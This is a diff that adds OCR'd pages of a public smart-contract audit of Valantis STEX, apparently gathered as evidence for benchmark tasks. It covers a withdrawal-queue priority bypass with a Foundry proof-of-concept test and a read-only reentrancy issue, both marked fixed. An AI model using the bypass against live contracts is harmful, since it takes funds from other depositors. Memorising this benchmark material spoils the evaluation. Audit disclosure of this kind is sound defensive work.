++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>header [72, 56, 186, 72]<|/det|>VLTS3-9\n<|det|>title [71, 97, 770, 190]<|/det|>WITHDRAWAL QUEUE PRIORITY\nBYPASS FOR FEELESS INSTANT\nWITHDRAWAL\n<|det|>text [72, 222, 204, 243]<|/det|>SEVERITY:\n<|det|>text [309, 223, 369, 243]<|/det|>High\n<|det|>title [72, 276, 259, 295]<|/det|>REMEDIATION:\n<|det|>text [71, 311, 926, 370]<|/det|>The creation of the LP withdrawal request should only take the order into account, e.g. by keeping a cumulative withdrawn amount that can then be used in claim to ensure that the claimer has the rights to the claimable ETH.\n<|det|>text [72, 403, 325, 425]<|/det|>STATUS: Fixed\n<|det|>title [72, 456, 259, 475]<|/det|>DESCRIPTION:\n<|det|>text [70, 490, 911, 557]<|/det|>When a Withdrawal is created, it references the cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint pointer to track when a claim is allowed, according to the existing withdrawal queue.\n<|det|>text [118, 580, 725, 694]<|/det|>LPWithdrawals[idLPWithdrawal] = LPWithdrawalRequest({\n    recipient: _recipient,\n    amountToken1: amountToken1.toUint96(),\n    cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint:\n    cumulativeAmountToken1ClaimableLPWithdrawal\n});\n<|det|>text [70, 719, 905, 833]<|/det|>However, cumulativeAmountToken1ClaimableLPWithdrawal only gets updated after a call to the update function and only if the HYPE was received from the Overseer. So any withdrawal request made after another one while it's not claimable yet are in the same queue at the same cumulative amount:\n<|det|>text [97, 857, 833, 936]<|/det|>if (address(this).balance <= amountToken1ClaimableLPWithdrawalCache) {\n    amountToken1ClaimableLPWithdrawal = address(this).balance;\n    return;\n}\n<|det|>page_number [911, 956, 935, 970]<|/det|>21\n", "page_image_sha256": "51627636f7c315eae84fa175ce4d940a73dbec5687d29bc8ae01def75ba77e9c", "page_number": 21, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>header [72, 56, 186, 72]<|/det|>VLTS3-9\n<|det|>title [71, 97, 770, 190]<|/det|>WITHDRAWAL QUEUE PRIORITY\nBYPASS FOR FEELESS INSTANT\nWITHDRAWAL\n<|det|>text [72, 222, 204, 243]<|/det|>SEVERITY:\n<|det|>text [309, 223, 369, 243]<|/det|>High\n<|det|>title [72, 276, 259, 295]<|/det|>REMEDIATION:\n<|det|>text [71, 311, 926, 370]<|/det|>The creation of the LP withdrawal request should only take the order into account, e.g. by keeping a cumulative withdrawn amount that can then be used in claim to ensure that the claimer has the rights to the claimable ETH.\n<|det|>text [72, 403, 325, 425]<|/det|>STATUS: Fixed\n<|det|>title [72, 456, 259, 475]<|/det|>DESCRIPTION:\n<|det|>text [70, 490, 911, 557]<|/det|>When a Withdrawal is created, it references the cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint pointer to track when a claim is allowed, according to the existing withdrawal queue.\n<|det|>text [118, 580, 725, 694]<|/det|>LPWithdrawals[idLPWithdrawal] = LPWithdrawalRequest({\n    recipient: _recipient,\n    amountToken1: amountToken1.toUint96(),\n    cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint:\n    cumulativeAmountToken1ClaimableLPWithdrawal\n});\n<|det|>text [70, 719, 905, 833]<|/det|>However, cumulativeAmountToken1ClaimableLPWithdrawal only gets updated after a call to the update function and only if the HYPE was received from the Overseer. So any withdrawal request made after another one while it's not claimable yet are in the same queue at the same cumulative amount:\n<|det|>text [97, 857, 833, 936]<|/det|>if (address(this).balance <= amountToken1ClaimableLPWithdrawalCache) {\n    amountToken1ClaimableLPWithdrawal = address(this).balance;\n    return;\n}\n<|det|>page_number [911, 956, 935, 970]<|/det|>21\n", "page_image_sha256": "51627636f7c315eae84fa175ce4d940a73dbec5687d29bc8ae01def75ba77e9c", "page_number": 21, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0021_0024.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 411.324}, "timing_ms": {"decode": 1201, "sglang_total": 1419, "ttft": 217}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 494, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 772}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0021_0024.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 1741}
++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>text [70, 56, 904, 93]<|/det|>Moreover, it does not keep withdrawal sizes in mind. If a user withdraws 100 ETH, and the\n<|det|>text [70, 96, 905, 135]<|/det|>cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint is X, they can claim the withdrawal at X + 100.\n<|det|>text [70, 145, 912, 185]<|/det|>The following logic allows smaller deposits to be bypass the priority queue and effectively gain feeless instant withdrawals of their stHYPE to HYPE.\n<|det|>text [97, 214, 866, 351]<|/det|>if (\n    cumulativeAmountToken1ClaimableLPWithdrawal\n    < request.cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint +\nrequest.amountToken1\n) {\n    revert stHYPEWithdrawalModule__claim_cannotGetClaim();\n}\n<|det|>text [71, 386, 435, 406]<|/det|>Consider the following situation:\n<|det|>text [85, 415, 896, 474]<|/det|>1. User 1 withdraws 10 ETH\n(cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint = X), so they can withdraw at X + 10.\n<|det|>text [82, 476, 890, 513]<|/det|>2. The burn request is filled and redeemed, the Overseer sends 10 ETH to the Withdrawal Module.\n<|det|>text [82, 516, 370, 533]<|/det|>3. User 2 withdraws 1 ETH.\n<|det|>text [82, 536, 520, 554]<|/det|>4. Update is now called and fills 10 ETH.\n<|det|>text [82, 557, 301, 574]<|/det|>5. User 2 can claim.\n<|det|>text [82, 577, 831, 616]<|/det|>6. User 1 can claim but reverts due to not enough funds (only 9 ETH available).\n<|det|>text [97, 639, 818, 915]<|/det|>function burnToken0AfterWithdraw(uint256 _amountToken0, address _recipient)\nexternal\noverride\nonlySTEX\nnonReentrant\n{\n    // stHYPE is rebase, hence to need for conversion\n    uint256 amountToken1 = _amountToken0;\n\n    amountToken1PendingLPWithdrawal += amountToken1;\n\n    emit LPWithdrawalRequestCreated(idLPWithdrawal, amountToken1, _recipient);\n<|det|>page_number [909, 955, 939, 970]<|/det|>22\n", "page_image_sha256": "569666f170d3d0182a431d8366a8b549c4903b1bd4c1c36db15b7a7cd94f2494", "page_number": 22, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>text [70, 56, 904, 93]<|/det|>Moreover, it does not keep withdrawal sizes in mind. If a user withdraws 100 ETH, and the\n<|det|>text [70, 96, 905, 135]<|/det|>cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint is X, they can claim the withdrawal at X + 100.\n<|det|>text [70, 145, 912, 185]<|/det|>The following logic allows smaller deposits to be bypass the priority queue and effectively gain feeless instant withdrawals of their stHYPE to HYPE.\n<|det|>text [97, 214, 866, 351]<|/det|>if (\n    cumulativeAmountToken1ClaimableLPWithdrawal\n    < request.cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint +\nrequest.amountToken1\n) {\n    revert stHYPEWithdrawalModule__claim_cannotGetClaim();\n}\n<|det|>text [71, 386, 435, 406]<|/det|>Consider the following situation:\n<|det|>text [85, 415, 896, 474]<|/det|>1. User 1 withdraws 10 ETH\n(cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint = X), so they can withdraw at X + 10.\n<|det|>text [82, 476, 890, 513]<|/det|>2. The burn request is filled and redeemed, the Overseer sends 10 ETH to the Withdrawal Module.\n<|det|>text [82, 516, 370, 533]<|/det|>3. User 2 withdraws 1 ETH.\n<|det|>text [82, 536, 520, 554]<|/det|>4. Update is now called and fills 10 ETH.\n<|det|>text [82, 557, 301, 574]<|/det|>5. User 2 can claim.\n<|det|>text [82, 577, 831, 616]<|/det|>6. User 1 can claim but reverts due to not enough funds (only 9 ETH available).\n<|det|>text [97, 639, 818, 915]<|/det|>function burnToken0AfterWithdraw(uint256 _amountToken0, address _recipient)\nexternal\noverride\nonlySTEX\nnonReentrant\n{\n    // stHYPE is rebase, hence to need for conversion\n    uint256 amountToken1 = _amountToken0;\n\n    amountToken1PendingLPWithdrawal += amountToken1;\n\n    emit LPWithdrawalRequestCreated(idLPWithdrawal, amountToken1, _recipient);\n<|det|>page_number [909, 955, 939, 970]<|/det|>22\n", "page_image_sha256": "569666f170d3d0182a431d8366a8b549c4903b1bd4c1c36db15b7a7cd94f2494", "page_number": 22, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0021_0024.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 405.97}, "timing_ms": {"decode": 1340, "sglang_total": 1557, "ttft": 216}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 544, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 822}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0021_0024.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 1840}
++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>text [97, 65, 791, 222]<|/det|>LPWithdrawals[idLPWithdrawal] = LPWithdrawalRequest({\n    recipient: _recipient,\n    amountToken1: amountToken1.toUint96(),\n    cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint:\n    cumulativeAmountToken1ClaimableLPWithdrawal\n    });\n    idLPWithdrawal++;\n}\n<|det|>page_number [908, 955, 939, 970]<|/det|>23\n", "page_image_sha256": "a3c130b08f0f50dd0f9458581579efb0d2b5f6b3bf10776205353b8226d2c217", "page_number": 23, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>text [97, 65, 791, 222]<|/det|>LPWithdrawals[idLPWithdrawal] = LPWithdrawalRequest({\n    recipient: _recipient,\n    amountToken1: amountToken1.toUint96(),\n    cumulativeAmountToken1ClaimableLPWithdrawalCheckpoint:\n    cumulativeAmountToken1ClaimableLPWithdrawal\n    });\n    idLPWithdrawal++;\n}\n<|det|>page_number [908, 955, 939, 970]<|/det|>23\n", "page_image_sha256": "a3c130b08f0f50dd0f9458581579efb0d2b5f6b3bf10776205353b8226d2c217", "page_number": 23, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0021_0024.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 458.515}, "timing_ms": {"decode": 229, "sglang_total": 441, "ttft": 212}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 105, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 383}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0021_0024.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 357}
++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>header [73, 57, 275, 76]<|/det|>Proof-of-concept:\n<|det|>text [97, 106, 885, 844]<|/det|>function testWithdraw__earlyWithdrawalModule() public {\n    address recipient = makeAddr(\"RECIPIENT\");\n    address recipient2 = makeAddr(\"RECIPIENT2\");\n\n    _deposit(10e18, recipient);\n    token0.mint{value: 10e18}(address(pool));\n\n    // user 2 shares.\n    uint256 shares2 = stex.deposit(1e18, 1, block.timestamp, recipient2);\n    // user 1 shares.\n    uint256 shares = stex.balanceOf(recipient);\n\n    // prank user 1\n    vm.startPrank(recipient);\n    // withdraw user 1 shares at X = 0 and is able to withdraw at x+10 now\n    (uint256 amount0, uint256 amount1) = stex.withdraw(shares, 0, 0, block.timestamp, recipient, false, false);\n    vm.stopPrank();\n\n    // overseer only returned 5 eth.\n    vm.deal(address(withdrawalModule), 5e18);\n    withdrawModule.update();\n    vm.warp(block.timestamp + 1);\n    vm.roll(block.number + 1);\n\n    // prank user2\n    vm.startPrank(recipient2);\n    // withdraw after 5 eth was updated.\n    (uint256 amount4, uint256 amount3) = stex.withdraw(shares2/2, 0, 0, block.timestamp, recipient2, false, false);\n    vm.stopPrank();\n<|det|>page_number [909, 955, 939, 970]<|/det|>24\n", "page_image_sha256": "a22d5d4b2092ea857508750acaf8a8c4a6fc9fecccc8c312de3b62f706d8c499", "page_number": 24, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>header [73, 57, 275, 76]<|/det|>Proof-of-concept:\n<|det|>text [97, 106, 885, 844]<|/det|>function testWithdraw__earlyWithdrawalModule() public {\n    address recipient = makeAddr(\"RECIPIENT\");\n    address recipient2 = makeAddr(\"RECIPIENT2\");\n\n    _deposit(10e18, recipient);\n    token0.mint{value: 10e18}(address(pool));\n\n    // user 2 shares.\n    uint256 shares2 = stex.deposit(1e18, 1, block.timestamp, recipient2);\n    // user 1 shares.\n    uint256 shares = stex.balanceOf(recipient);\n\n    // prank user 1\n    vm.startPrank(recipient);\n    // withdraw user 1 shares at X = 0 and is able to withdraw at x+10 now\n    (uint256 amount0, uint256 amount1) = stex.withdraw(shares, 0, 0, block.timestamp, recipient, false, false);\n    vm.stopPrank();\n\n    // overseer only returned 5 eth.\n    vm.deal(address(withdrawalModule), 5e18);\n    withdrawModule.update();\n    vm.warp(block.timestamp + 1);\n    vm.roll(block.number + 1);\n\n    // prank user2\n    vm.startPrank(recipient2);\n    // withdraw after 5 eth was updated.\n    (uint256 amount4, uint256 amount3) = stex.withdraw(shares2/2, 0, 0, block.timestamp, recipient2, false, false);\n    vm.stopPrank();\n<|det|>page_number [909, 955, 939, 970]<|/det|>24\n", "page_image_sha256": "a22d5d4b2092ea857508750acaf8a8c4a6fc9fecccc8c312de3b62f706d8c499", "page_number": 24, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0021_0024.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 407.923}, "timing_ms": {"decode": 934, "sglang_total": 1149, "ttft": 214}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 381, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 659}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0021_0024.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 1214}
++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>text [136, 65, 655, 288]<|/det|>// after few withdraws it reaches 10 eth.\nvm.deal(address(withdrawalModule), 10e18);\nwithdrawalModule.update();\n\n// user 2 skips priority que and claims first\nwithdrawalModule.claim(1);\n\n// user 1 cannot claim his funds.\nvm.expectRevert();\nwithdrawalModule.claim(0);\n}\n<|det|>page_number [908, 955, 939, 970]<|/det|>25\n", "page_image_sha256": "8b43bd5f0ace32d9e6f68aafb95fae275f4c78a5b8325dff75abcfc7557bd016", "page_number": 25, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>text [136, 65, 655, 288]<|/det|>// after few withdraws it reaches 10 eth.\nvm.deal(address(withdrawalModule), 10e18);\nwithdrawalModule.update();\n\n// user 2 skips priority que and claims first\nwithdrawalModule.claim(1);\n\n// user 1 cannot claim his funds.\nvm.expectRevert();\nwithdrawalModule.claim(0);\n}\n<|det|>page_number [908, 955, 939, 970]<|/det|>25\n", "page_image_sha256": "8b43bd5f0ace32d9e6f68aafb95fae275f4c78a5b8325dff75abcfc7557bd016", "page_number": 25, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0025_0028.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 472.34}, "timing_ms": {"decode": 235, "sglang_total": 437, "ttft": 201}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 111, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 389}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0025_0028.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 364}
+diff --git a/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/H-05.pages.jsonl b/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/H-05.pages.jsonl
+new file mode 100644
+index 0000000..a18900e
+--- /dev/null
++++ b/project/evmbench/audits/2025-03-valantis-stex/ocr_evidence/pdf_002911_39a2c2ee71c9/H-05.pages.jsonl
+@@ -0,0 +1,2 @@
++{"created_at": "2026-07-01T17:46:49.843216+00:00", "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_text": "<PAGE><|det|>header [71, 56, 194, 72]<|/det|>VLTS3-14\n<|det|>title [71, 97, 877, 190]<|/det|>READ-ONLY REENTRANCY IN\nWITHDRAW CAN LEAD TO SWAP FEE\nMANIPULATION\n<|det|>text [73, 222, 207, 242]<|/det|>SEVERITY:\n<|det|>text [290, 223, 388, 242]<|/det|>Medium\n<|det|>text [72, 276, 152, 294]<|/det|>PATH:\n<|det|>text [71, 311, 496, 329]<|/det|>src/STEXAMM.sol:withdraw#L523-L624\n<|det|>title [72, 350, 259, 370]<|/det|>REMEDIATION:\n<|det|>text [70, 386, 878, 445]<|/det|>It is advisable to use a modifier for view function that are susceptible to read-only reentrancy. The modifier only checks whether the reentrancy guard is active and does not need to set it.\n<|det|>text [73, 477, 325, 498]<|/det|>STATUS: Fixed\n<|det|>title [72, 531, 259, 550]<|/det|>DESCRIPTION:\n<|det|>text [70, 565, 875, 657]<|/det|>In the withdraw function for LP shareholders in STEXAMM, the caller can choose to unwrap their wHYPE and receive native HYPE instead. This happens on lines 599-602 and an external call is made to the receiver, giving them execution.\n<|det|>text [70, 668, 918, 781]<|/det|>Even though the function itself has the nonReentrant modifier, it is still an intermediate state: the token0{stHYPE} has already been burned previously using burnToken0AfterWithdraw on line 589, while remaining token1{wHYPE} is yet to be taken out of the pool using withdrawLiquidity on line 611.\n<|det|>text [70, 795, 837, 888]<|/det|>Even though the pool itself does not use the token0/token1 ratio for valuation, it does use this ratio to calculate the swap fee in STEXRatioSwapFeeModule:getSwapFeeInBips, which is used in SovereignPool:swap.\n<|det|>page_number [907, 955, 941, 970]<|/det|>26\n", "page_image_sha256": "18722b210342973fa8e1ae2f6ca321656e55a7a82e66ba22e386c908d2d03d10", "page_number": 26, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_record": {"code_blocks": [], "confidence": null, "created_at": "2026-07-01T17:46:49.843216+00:00", "layout_blocks": [], "ocr_backend": "sglang", "ocr_endpoint_version": "modal-sglang-unlimited-ocr-v1", "ocr_model": "Unlimited-OCR", "ocr_model_version": "Unlimited-OCR", "ocr_settings": {"dpi": 300, "image_mode": "base", "mode": "pages", "ngram_size": 35, "ngram_window": 1024, "prompt": "Multi page parsing."}, "ocr_text": "<PAGE><|det|>header [71, 56, 194, 72]<|/det|>VLTS3-14\n<|det|>title [71, 97, 877, 190]<|/det|>READ-ONLY REENTRANCY IN\nWITHDRAW CAN LEAD TO SWAP FEE\nMANIPULATION\n<|det|>text [73, 222, 207, 242]<|/det|>SEVERITY:\n<|det|>text [290, 223, 388, 242]<|/det|>Medium\n<|det|>text [72, 276, 152, 294]<|/det|>PATH:\n<|det|>text [71, 311, 496, 329]<|/det|>src/STEXAMM.sol:withdraw#L523-L624\n<|det|>title [72, 350, 259, 370]<|/det|>REMEDIATION:\n<|det|>text [70, 386, 878, 445]<|/det|>It is advisable to use a modifier for view function that are susceptible to read-only reentrancy. The modifier only checks whether the reentrancy guard is active and does not need to set it.\n<|det|>text [73, 477, 325, 498]<|/det|>STATUS: Fixed\n<|det|>title [72, 531, 259, 550]<|/det|>DESCRIPTION:\n<|det|>text [70, 565, 875, 657]<|/det|>In the withdraw function for LP shareholders in STEXAMM, the caller can choose to unwrap their wHYPE and receive native HYPE instead. This happens on lines 599-602 and an external call is made to the receiver, giving them execution.\n<|det|>text [70, 668, 918, 781]<|/det|>Even though the function itself has the nonReentrant modifier, it is still an intermediate state: the token0{stHYPE} has already been burned previously using burnToken0AfterWithdraw on line 589, while remaining token1{wHYPE} is yet to be taken out of the pool using withdrawLiquidity on line 611.\n<|det|>text [70, 795, 837, 888]<|/det|>Even though the pool itself does not use the token0/token1 ratio for valuation, it does use this ratio to calculate the swap fee in STEXRatioSwapFeeModule:getSwapFeeInBips, which is used in SovereignPool:swap.\n<|det|>page_number [907, 955, 941, 970]<|/det|>26\n", "page_image_sha256": "18722b210342973fa8e1ae2f6ca321656e55a7a82e66ba22e386c908d2d03d10", "page_number": 26, "pdf_id": "pdf_002911_39a2c2ee71c9", "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0025_0028.raw.json", "source_abs_path": "/home/experiments_base/smart-contract-data/crawlers/output/repos/audit_repos/Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "tables": [], "throughput": {"output_units": "tokens", "output_units_per_second": 427.127}, "timing_ms": {"decode": 1187, "sglang_total": 1399, "ttft": 212}, "usage": {"completion_token_source": "openai_usage", "completion_tokens": 507, "prompt_tokens": 278, "prompt_tokens_details": null, "reasoning_tokens": 0, "total_tokens": 785}, "warnings": []}, "raw_response_ref": "chunk_0028/other_audit_repo_pdfs/pdf_002911_39a2c2ee71c9_valantis-mar-25_Final/pages_0025_0028.raw.json", "schema_version": "evmbench_task_creation.ocr_page.v1", "source_bucket": "other_audit_repo_pdfs", "source_filename": "valantis-mar-25(Final).pdf", "source_page_count": 38, "source_pdf_sha256": "64bf545adb3699eed16cd21abb0d6db6a651ca273e2992a02122825ec61966a7", "source_rel_path": "Smart-Contract-Review-Public-Reports/valantis-mar-25(Final).pdf", "text_length": 1671}
